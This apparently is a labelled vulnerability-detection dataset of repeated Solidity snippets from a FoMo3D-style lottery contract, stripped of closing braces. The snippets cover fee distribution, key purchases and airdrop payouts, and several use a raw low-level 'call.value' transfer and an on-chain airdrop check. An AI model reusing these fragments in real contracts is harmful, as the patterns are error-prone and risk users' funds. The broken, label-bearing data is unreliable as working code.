function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
330 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
331 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
332 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
333 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
